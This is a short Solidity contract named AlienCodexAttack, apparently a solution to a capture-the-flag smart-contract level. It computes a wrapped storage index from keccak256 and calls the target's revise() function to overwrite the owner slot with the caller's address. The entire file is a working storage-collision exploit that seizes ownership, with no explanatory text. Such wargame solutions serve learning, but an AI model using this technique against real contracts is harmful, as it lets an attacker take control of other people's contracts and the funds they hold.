pragma solidity ^0.6.0;

interface IAlienCodex {
    function revise(uint i, bytes32 _content) external;
}

contract AlienCodexAttack{

    function attack(address _address) public {
        uint index = uint256(2)**uint256(256)-uint256(keccak256(abi.encodePacked(uint256(1))));
        IAlienCodex(_address).revise(index,bytes32(uint256(uint160(msg.sender))));
    }
}